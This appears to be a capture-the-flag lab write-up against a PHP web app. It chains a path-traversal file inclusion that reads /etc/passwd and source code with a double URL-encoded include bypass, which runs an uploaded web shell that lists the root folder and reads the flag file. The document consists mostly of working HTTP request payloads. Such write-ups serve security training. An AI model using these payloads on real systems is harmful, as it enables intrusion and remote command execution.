```
GET /api/image.php?p=....//....//....//....//....//....//etc/passwd
```
- LFI!
```
GET /api/image.php?p=....//api/application.php HTTP/1.1
Host: 94.237.123.185:53384
Accept-Language: en-US,en;q=0.9
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36
Accept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8
Referer: http://94.237.123.185:53384/
Accept-Encoding: gzip, deflate, br
Connection: keep-alive


```
- Response:
```
<?php
$firstName = $_POST["firstName"];
$lastName = $_POST["lastName"];
$email = $_POST["email"];
$notes = (isset($_POST["notes"])) ? $_POST["notes"] : null;

$tmp_name = $_FILES["file"]["tmp_name"];
$file_name = $_FILES["file"]["name"];
$ext = end((explode(".", $file_name)));
$target_file = "../uploads/" . md5_file($tmp_name) . "." . $ext;
move_uploaded_file($tmp_name, $target_file);

header("Location: /thanks.php?n=" . urlencode($firstName));
?>
```
- Uploaded files are stored as the md5

```
GET /api/image.php?p=....//contact.php HTTP/1.1
Host: 94.237.123.185:53384
Accept-Language: en-US,en;q=0.9
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36
Accept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8
Referer: http://94.237.123.185:53384/
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

```
- This shows a parameter "region" that is vulnerable

```
<?php
                    $region = "AT";
                    $danger = false;

                    if (isset($_GET["region"])) {
                        if (str_contains($_GET["region"], ".") || str_contains($_GET["region"], "/")) {
                            echo "'region' parameter contains invalid character(s)";
                            $danger = true;
                        } else {
                            $region = urldecode($_GET["region"]);
                        }
                    }

                    if (!$danger) {
                        include "./regions/" . $region . ".php";
                    }
                    ?>
```
- If the parameter contains a '.' or a '/' then it will not work.
- Therefore, let's URL encode ../ twice

../uploads/ -> %2E%2E%2Fuploads%2F
%2E%2E%2Fuploads%2F -> %252E%252E%252Fuploads%252F

%252E%252E%252Fuploads%252F + md5hash of file name (shell.php)
```
md5sum shell.php
```

```
GET /contact.php?region=%252E%252E%252Fuploads%252Fe88d9c921ac17e074964e2c22d780f03&cmd=ls%20/ HTTP/1.1
Host: 94.237.123.185:53384
Accept-Language: en-US,en;q=0.9
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36
Accept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8
Referer: http://94.237.123.185:53384/
Accept-Encoding: gzip, deflate, br
Connection: keep-alive


```
- GET /contact.php?region=%252E%252E%252Fuploads%252Fe88d9c921ac17e074964e2c22d780f03&cmd=cat%20/flag_09ebca.txt
